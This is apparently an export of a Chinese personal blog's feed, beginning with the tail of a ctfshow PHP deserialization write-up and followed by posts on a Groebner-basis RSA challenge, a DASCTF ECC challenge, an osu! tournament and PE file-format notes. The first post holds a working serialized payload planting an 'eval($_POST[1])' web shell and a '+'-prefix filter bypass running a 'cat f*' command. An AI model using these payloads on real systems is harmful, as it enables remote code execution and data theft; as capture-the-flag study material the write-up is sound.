<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">user = </span><br><span class="line">O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>ctfShowUser%<span class="number">00</span><span class="keyword">class</span>%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>backDoor%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>backDoor%<span class="number">00</span>code%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A16%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">eval</span>%<span class="number">28</span>%<span class="number">24</span>_POST%<span class="number">5</span>B1%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>传这种后门后续操作方便点</p>
<h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><p>题目多加了一个过滤限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看视频学到可以在O后面的数字前面加上’+’来绕过这个匹配</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:+<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxy&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;isVip&quot;</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;O:+<span class="number">8</span>:<span class="string">&quot;backDoor&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;echo system(&#x27;cat f*&#x27;);&quot;</span>;&#125;;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>Groebner基</title>
    <url>/2023/12/04/Groebner%E5%9F%BA/</url>
    <content><![CDATA[<p>目前还完全理解不了原理 先记录一些与Groebner基有关的题目</p>
<span id="more"></span>

<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2019红帽杯related"><a href="#2019红帽杯related" class="headerlink" title="2019红帽杯related"></a>2019红帽杯related</h2><p>题目给定</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n</span><br><span class="line">s = s0+s1+s2</span><br><span class="line">c0 = s0^<span class="number">17</span> (mod n)</span><br><span class="line">c1 = s1^<span class="number">17</span> (mod n)</span><br><span class="line">c2 = s2^<span class="number">17</span> (mod n)</span><br><span class="line">c3 = s3^<span class="number">17</span> (mod n)</span><br><span class="line">s3 = <span class="number">65537</span>*s0 - <span class="number">66666</span>*s1 + <span class="number">12345</span>*s2</span><br></pre></td></tr></table></figure>
<p>求s0,s1,s2</p>
<p>题目大致可以看成一种相关消息攻击的变形 wiki提供了以下方法</p>
<p><img src="https://s2.loli.net/2023/12/04/arkovT57ScK42Zj.png" alt="img"></p>
<p>sage打印一下中间求得的groebner基 是这种形式:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[x + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498137656000537211565616276407165730632699</span>, y + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498129910188939072517737868873227804201884</span>, z + <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498069823870958439283760172034252636423374</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498205967870181640370981402627360812251649</span></span><br><span class="line">s = <span class="number">280513550110197745829890567436265496990</span></span><br><span class="line">c1 = <span class="number">10607235400098586699994392584841806592000660816191315008947917773605476365884572056544621466807636237415893192966935651590312237598366247520986667580174438232591692369894702423377081613821241343307094343575042030793564118302488401888197517625333923710172738913771484628557310164974384462856047065486913046647133386246976457961265115349103039946802386897315176633274295410371986422039106745216230401123542863714301114753239888820442112538285194875243192862692290859625788686421276234445677411280606266052059579743874849594812733193363406594409214632722438592376518310171297234081555028727538951934761726878443311071990</span></span><br><span class="line">c2 = <span class="number">2665348075952836665455323350891842781938471372943896177948046901127648217780657532963063228780230203325378931053293617434754585479452556620021360669764370971665619743473463613391689402725053682169256850873752706252379747752552015341379702582040497607180172854652311649467878714425698676142212588380080361100526614423533767196749274741380258842904968147508033091819979042560336703564128279527380969385330845759998657540777339113519036552454829323666242269607225156846084705957131127720351868483375138773025602253783595007177712673092409157674720974653789039702431795168654387038080256838321255342848782705785524911705</span></span><br><span class="line">c3 = <span class="number">4881225713895414151830685259288740981424662400248897086365166643853409947818654509692299250960938511400178276416929668757746679501254041354795468626916196040017280791985239849062273782179873724736552198083211250561192059448730545500442981534768431023858984817288359193663144417753847196868565476919041282010484259630583394963580424358743754334956833598351424515229883148081492471874232555456362089023976929766530371320876651940855297249474438564801349160584279330339012464716197806221216765180154233949297999618011342678854874769762792918534509941727751433687189532019000334342211838299512315478903418642056097679717</span></span><br><span class="line"></span><br><span class="line">R.&lt;x,y,z&gt; = Zmod(n)[]</span><br><span class="line">I = ideal(x+y+z-s,x^<span class="number">17</span>-c1,y^<span class="number">17</span>-c2,z^<span class="number">17</span>-c3)</span><br><span class="line">res = I.groebner_basis()</span><br><span class="line">m1 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498137656000537211565616276407165730632699</span></span><br><span class="line">m2 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498129910188939072517737868873227804201884</span></span><br><span class="line">m3 = -<span class="number">16084923760264169099484353317952979348361855860935256157402027983349457021767614332173154044206967015252105109115289920685657394517879177103414348487477378025259589760996270909325371731433876289897874303733424115117776042592359041482059737708721396118254756778152435821692154824236881182156000806958403005506732891823555324800528934757672719379501318525189471726279397236710401497352477683714139039769105043411654493442696289499967521222951945823233371845110807469944602345293068346574630273539870116158817556523565199093874587097230314166365220290730937380983228599414137341498069823870958439283760172034252636423374</span></span><br><span class="line"></span><br><span class="line">m1 = m1%n</span><br><span class="line">m2 = m2%n</span><br><span class="line">m3 = m3%n</span><br><span class="line"></span><br><span class="line">m = (m3&lt;&lt;<span class="number">256</span>)+(m2&lt;&lt;<span class="number">128</span>)+m1</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;bf684fc7-5398-4bf3-ad5f-cfe3dc53a202&#125;\x06\x06\x06\x06\x06\x06&#x27;</span></span><br></pre></td></tr></table></figure>
<p>先记着吧 完全没搞懂groebner基的神奇作用</p>
<h2 id="DASCTF-Apr-2023-ECC"><a href="#DASCTF-Apr-2023-ECC" class="headerlink" title="DASCTF Apr.2023 ECC"></a>DASCTF Apr.2023 ECC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, p, q, a, b, e1, e2, e3</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> isPrime(p) <span class="keyword">and</span> isPrime(q)</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;DASCTF&#123;&quot;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ECC</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, a, b, p, q, e</span>):</span><br><span class="line">        self.p, self.q = p, q</span><br><span class="line">        self.a, self.b = a, b</span><br><span class="line">        self.N         = p * q</span><br><span class="line">        self.e         = e</span><br><span class="line">        self.Kbits     = <span class="number">8</span></span><br><span class="line">        self.Ep        = EllipticCurve(IntegerModRing(p), [a, b])</span><br><span class="line">        self.Eq        = EllipticCurve(IntegerModRing(q), [a, b])</span><br><span class="line"></span><br><span class="line">        N1 = self.Ep.order()</span><br><span class="line">        N2 = <span class="number">2</span> * p + <span class="number">2</span> - N1</span><br><span class="line">        N3 = self.Eq.order()</span><br><span class="line">        N4 = <span class="number">2</span> * q + <span class="number">2</span> - N3</span><br><span class="line"></span><br><span class="line">        self.d = &#123;</span><br><span class="line">            ( <span class="number">1</span>,  <span class="number">1</span>): inverse_mod(e, lcm(N1, N3)),</span><br><span class="line">            ( <span class="number">1</span>, -<span class="number">1</span>): inverse_mod(e, lcm(N1, N4)),</span><br><span class="line">            (-<span class="number">1</span>,  <span class="number">1</span>): inverse_mod(e, lcm(N2, N3)),</span><br><span class="line">            (-<span class="number">1</span>, -<span class="number">1</span>): inverse_mod(e, lcm(N2, N4))</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        self.E = EllipticCurve(IntegerModRing(self.N), [a, b])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        msg_point = self.msg_to_point(plaintext, <span class="literal">True</span>)</span><br><span class="line">        mp = self.Ep(msg_point)</span><br><span class="line">        mq = self.Eq(msg_point)</span><br><span class="line">        cp = (self.e * mp).xy()</span><br><span class="line">        cq = (self.e * mq).xy()</span><br><span class="line">        cp = (<span class="built_in">int</span>(cp[<span class="number">0</span>]), <span class="built_in">int</span>(cp[<span class="number">1</span>]))</span><br><span class="line">        cq = (<span class="built_in">int</span>(cq[<span class="number">0</span>]), <span class="built_in">int</span>(cq[<span class="number">1</span>]))</span><br><span class="line">        c  = (<span class="built_in">int</span>(crt([cp[<span class="number">0</span>], cq[<span class="number">0</span>]], [self.p, self.q])), \</span><br><span class="line">              <span class="built_in">int</span>(crt([cp[<span class="number">1</span>], cq[<span class="number">1</span>]], [self.p, self.q])))</span><br><span class="line">        c = self.E(c)</span><br><span class="line">        <span class="keyword">return</span> c.xy()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">self, ciphertext</span>):</span><br><span class="line">        x = ciphertext</span><br><span class="line">        w = x^<span class="number">3</span> + self.a*x + self.b % self.N</span><br><span class="line"></span><br><span class="line">        P.&lt;Yp&gt; = PolynomialRing(Zmod(self.p))</span><br><span class="line">        fp = x^<span class="number">3</span> + self.a*x + self.b -Yp^<span class="number">2</span></span><br><span class="line">        yp = fp.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        P.&lt;Yq&gt; = PolynomialRing(Zmod(self.q))</span><br><span class="line">        fq = x^<span class="number">3</span> + self.a*x + self.b -Yq^<span class="number">2</span></span><br><span class="line">        yq = fq.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        y = crt([<span class="built_in">int</span>(yp), <span class="built_in">int</span>(yq)], [self.p, self.q])</span><br><span class="line"></span><br><span class="line">        cp, cq = self.Ep((x, y)), self.Eq((x, y))</span><br><span class="line">        legendre_symbol_p = legendre_symbol(w, self.p)</span><br><span class="line">        legendre_symbol_q = legendre_symbol(w, self.q)</span><br><span class="line"></span><br><span class="line">        mp = (self.d[(legendre_symbol_p, legendre_symbol_q)] * cp).xy()</span><br><span class="line">        mq = (self.d[(legendre_symbol_p, legendre_symbol_q)] * cq).xy()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> crt([<span class="built_in">int</span>(mp[<span class="number">0</span>]), <span class="built_in">int</span>(mq[<span class="number">0</span>])], [self.p, self.q]) &gt;&gt; self.Kbits</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">msg_to_point</span>(<span class="params">self, x, shift=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="keyword">if</span> shift:</span><br><span class="line">            x &lt;&lt;= self.Kbits</span><br><span class="line">        res_point = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span> &lt;&lt; self.Kbits):</span><br><span class="line">            P.&lt;Yp&gt; = PolynomialRing(Zmod(self.p))</span><br><span class="line">            fp = x^<span class="number">3</span> + self.a*x + self.b - Yp^<span class="number">2</span></span><br><span class="line">            P.&lt;Yq&gt; = PolynomialRing(Zmod(self.q))</span><br><span class="line">            fq = x^<span class="number">3</span> + self.a*x + self.b - Yq^<span class="number">2</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                yp, yq = <span class="built_in">int</span>(fp.roots()[<span class="number">0</span>][<span class="number">0</span>]), <span class="built_in">int</span>(fq.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">                y = crt([yp, yq], [self.p, self.q])</span><br><span class="line">                E = EllipticCurve(IntegerModRing(self.p*self.q), [self.a, self.b])</span><br><span class="line">                res_point = E.point((x, y))</span><br><span class="line">                <span class="keyword">return</span> res_point</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                x += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res_point</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ecc1 = ECC(a, b, p, q, e1)</span><br><span class="line">ecc2 = ECC(a, b, p, q, e2)</span><br><span class="line">ecc3 = ECC(a, b ,p, q, e3)</span><br><span class="line">gift = p * q * getPrime(<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">secret = bytes_to_long(flag[<span class="number">7</span>:-<span class="number">1</span>].encode())</span><br><span class="line">ciphertext1 = ecc1.enc(secret)</span><br><span class="line">ciphertext2 = ecc2.enc(secret)</span><br><span class="line">ciphertext3 = ecc3.enc(secret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    </span><br><span class="line">    f.write(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;e3 = <span class="subst">&#123;e3&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;gift = <span class="subst">&#123;gift&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C1 = <span class="subst">&#123;ciphertext1&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C2 = <span class="subst">&#123;ciphertext2&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;C3 = <span class="subst">&#123;ciphertext3&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>附件:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e1 = <span class="number">516257683822598401</span></span><br><span class="line">e2 = <span class="number">391427904712695553</span></span><br><span class="line">e3 = <span class="number">431785901506020973</span></span><br><span class="line">gift = <span class="number">10954621221812651197619957228527372749810730943802288293715079353550311138677754821746522832935330138708418986232770630995550582619687239759917418738050269898943719822278514605075330569827210725314869039623167495140328454254640051293396463956732280673238182897228775094614386379902845973838934549168736103799539422716766688822243954145073458283746306858717624769112552867126607212724068484647333634548047278790589999183913</span></span><br><span class="line">C1 = (<span class="number">1206929895217993244310816423179846824808172528120308055773133254871707902120929022352908110998765937447485028662679732041</span>, <span class="number">652060368795242052052268674691241294013033011634464089331399905627588366001436638328894634036437584845563026979258880828</span>)</span><br><span class="line">C2 = (<span class="number">1819289899794579183151870678118089723240127083264590266958711858768481876209114055565064148870164568925012329554392844153</span>, <span class="number">1110245535005295568283994217305072930348872582935452177061131445872842458573911993488746144360725164302010081437373324551</span>)</span><br><span class="line">C3 = (<span class="number">1112175463080774353628562547288706975571507012326470665917118873336738873653792420189391867408691423887642725415133046354</span>, <span class="number">1820636035485820691083758790204536675748006232767111209985774382700260408550258280489088658228739971137550264759084468620</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ECC学的还是太肤浅了 恶补一下ECC再来看吧。。。</p>
]]></content>
      <categories>
        <category>CTF-Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>osu</title>
    <url>/2023/12/03/osu/</url>
    <content><![CDATA[<p><strong>Welcome to osu!</strong></p>
<span id="more"></span>

<h1 id="OWC2023-Korea-VS-USA"><a href="#OWC2023-Korea-VS-USA" class="headerlink" title="OWC2023 Korea VS USA"></a>OWC2023 Korea VS USA</h1><p>很好奇为什么要连着打两场？<br>masaka第一场算是胜者组决赛 然后bracket reset再来打真正的grandfinal？🤖</p>
<p><img src="https://s2.loli.net/2023/12/03/QslebCr415jmOwY.png" alt="img"></p>
<p><img src="https://s2.loli.net/2023/12/03/Yuv79oQjWOH6npJ.png" alt="img"></p>
<p>How Could He make it!!!WTF!!! MY GOD WORST_HR_PLAYER!!!!</p>
<p>FM的strategy：</p>
<p><img src="https://s2.loli.net/2023/12/03/URiJLec6dNvSklo.png" alt="img"></p>
<p>flyingtuna一人承担所有 然后让Karcher打NM(other than HR)FC<br>what  a textbook strategy！！！ wow !!!</p>
<p>Are you kidding me ??? lol😂</p>
<p><img src="https://s2.loli.net/2023/12/03/ny1Cz9uobixJlaF.png" alt="img"></p>
<p>How can you hit without anything? lol.O(∩_∩)O</p>
<p>Finally, we have TieBreaker…<br>WTF TB: 8.60⭐ length:6:43 WTF</p>
<p><img src="https://s2.loli.net/2023/12/04/hXvoSkIZlO2yu8L.png" alt="img"></p>
<p>哎 USA几连冠了啊… Korea太可惜了啊啊！ 为什么最后TB不上worst_hr_player 啊！！！！！！！ 太可惜了吧~</p>
]]></content>
      <categories>
        <category>osu</category>
      </categories>
  </entry>
  <entry>
    <title>逆向工程核心原理-C13-PE文件格式-笔记</title>
    <url>/2023/12/03/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86-C13-PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>逆向工程核心原理-C13-PE文件格式-笔记</p>
<span id="more"></span>
<p>前几周粗浅看了一遍 由于是电子版 也没留下多大印象<br>最近CTF的re题看着太累了 做一个题挺耗时间的 想着是基础还是不够扎实<br>再者学逆向的目的也不全是CTF 掌握些理论还是很重要的<br>再来重新学一学 写篇笔记记录一下关键点 也启发自己思考</p>
<h1 id="13-1-介绍"><a href="#13-1-介绍" class="headerlink" title="13.1 介绍"></a>13.1 介绍</h1><p>PE32 &amp; PE+&#x2F;PE32+ 别写PE64 :(闹笑话</p>
<h1 id="13-2-PE文件格式"><a href="#13-2-PE文件格式" class="headerlink" title="13.2 PE文件格式"></a>13.2 PE文件格式</h1><p>学习PE文件格式就是学习PE头中的结构体<br><strong>十分重要！！！</strong></p>
<h2 id="13-2-1-基本结构"><a href="#13-2-1-基本结构" class="headerlink" title="13.2.1 基本结构"></a>13.2.1 基本结构</h2><p>DOS头到节区头是PE头部分(4D 5A … 50 45)<br>文件中使用偏移(offset) 内存中使用VA(虚拟地址)来表示位置 当文件加载到内存中时情况会改变 内容分为 .text .data .rsrc分别保存</p>
<h2 id="13-2-2-VA-RVA"><a href="#13-2-2-VA-RVA" class="headerlink" title="13.2.2 VA&amp;RVA"></a>13.2.2 VA&amp;RVA</h2><p>RVA(相对虚拟地址) + ImageBase(基准位置) &#x3D; VA<br>PE头内部信息大多以RVA形式 因为PE(尤其是DLL)加载到进程虚拟内存时由于该位置已经加载其他PE(DLL) 要通过重定位加载到其他空白的位置<br>用RVA就只需要记录ImageBase就可以得到VA</p>
<h1 id="13-3-PE头"><a href="#13-3-PE头" class="headerlink" title="13.3 PE头"></a>13.3 PE头</h1><h2 id="13-3-1-DOS头"><a href="#13-3-1-DOS头" class="headerlink" title="13.3.1 DOS头"></a>13.3.1 DOS头</h2><p>重点关注两个成员</p>
<ul>
<li>e_magic: DOS签名 (4D5A &#x3D;&gt; “MZ”)</li>
<li>e_lfanew: 指示NT头的偏移 (不同文件值可变)</li>
</ul>
<p>在书给的exe中 e_lfanew的值为 000000E0(小端序!)</p>
<h2 id="13-3-2-DOS存根"><a href="#13-3-2-DOS存根" class="headerlink" title="13.3.2 DOS存根"></a>13.3.2 DOS存根</h2><p>40~4D为汇编指令(有兴趣把它写入文件IDA康康)<br>主要就是用来输出一下”This program … DOS mode”就退出了 算是一种对于MS-DOS的兼容</p>
<h2 id="13-3-3-NT头"><a href="#13-3-3-NT头" class="headerlink" title="13.3.3 NT头"></a>13.3.3 NT头</h2><p>NT头的IMAGE_NT_HEADERS</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">  DWORD                   Signature;    <span class="comment">//签名</span></span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;   <span class="comment">//文件头</span></span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader; <span class="comment">//可选头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure>
<p>signature即为50450000(“PE”00)<br>IMAGE_NT_HEADERS结构体总大小为F8 很大</p>
<h2 id="13-3-4-NT头-文件头"><a href="#13-3-4-NT头-文件头" class="headerlink" title="13.3.4 NT头: 文件头"></a>13.3.4 NT头: 文件头</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> &#123;</span></span><br><span class="line">  WORD  Machine;</span><br><span class="line">  WORD  NumberOfSections;</span><br><span class="line">  DWORD TimeDateStamp;</span><br><span class="line">  DWORD PointerToSymbolTable;</span><br><span class="line">  DWORD NumberOfSymbols;</span><br><span class="line">  WORD  SizeOfOptionalHeader;</span><br><span class="line">  WORD  Characteristics;</span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>
<ul>
<li>Machine: 每个CPU都有唯一的machine码</li>
<li>NumberOfSections: 文件中存在的节区数量</li>
<li>SizeOfOptionalHeader: IMAGE_OPTIONAL_HEADER64结构体大小</li>
<li>Characteristics: 标识文件属性 是否可运行 是否为DLL等</li>
<li>TimeDateStamp: 该成员的值不影响运行 用来记录时间而已</li>
</ul>
